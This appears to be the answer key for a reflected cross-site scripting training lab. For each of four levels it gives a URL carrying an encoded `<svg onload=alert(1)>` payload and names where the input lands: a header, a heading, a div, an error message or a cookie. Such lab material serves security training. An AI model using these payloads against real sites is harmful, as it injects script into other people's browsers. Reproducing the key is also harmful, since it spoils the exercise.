# rsplit — solutions

Reflections that land in both headers/cookies and body; body injection works directly.

### rsplit-level1

`/rsplit/level1/?query=%3Csvg%20onload=alert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: reflected into custom header + body `<h1>`

### rsplit-level2

`/rsplit/level2/?name=%3Csvg%20onload=alert(1)%3E&color=blue`

- payload: `<svg onload=alert(1)>`
- context: name reflected in body div text

### rsplit-level3

`/rsplit/level3/?page=%3Csvg%20onload=alert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: page reflected in error message paragraph

### rsplit-level4

`/rsplit/level4/?pref=%3Csvg%20onload=alert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: pref reflected in body div (cookie also set)
